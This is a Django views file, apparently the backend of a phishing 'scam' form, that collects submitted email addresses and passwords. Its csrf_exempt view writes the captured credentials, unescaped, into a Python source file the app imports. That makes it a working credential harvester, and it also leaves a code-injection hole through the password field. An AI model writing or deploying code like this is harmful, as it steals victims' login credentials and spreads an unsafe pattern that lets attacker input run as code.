from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from .Scam import *
from os import chdir


def index(request):
    return render(request, 'index.html')

@csrf_exempt
def scamed(request):
    email = request.POST.get('email')
    password = request.POST.get('password')
    left_braces = '{'
    right_braces = '}'
    i = len(Users) + 1
    Cond = True
    if Cond:
        chdir('D:\Code\Django-Form-Scam\scam\scam')
        with open('Scam.py', 'a') as Scam:
            Scam.write(f'\nUsers[{i}] = {left_braces}"email": "{email}", "password": "{password}"{right_braces}\n')
    
    return render(request, 'scamed.html')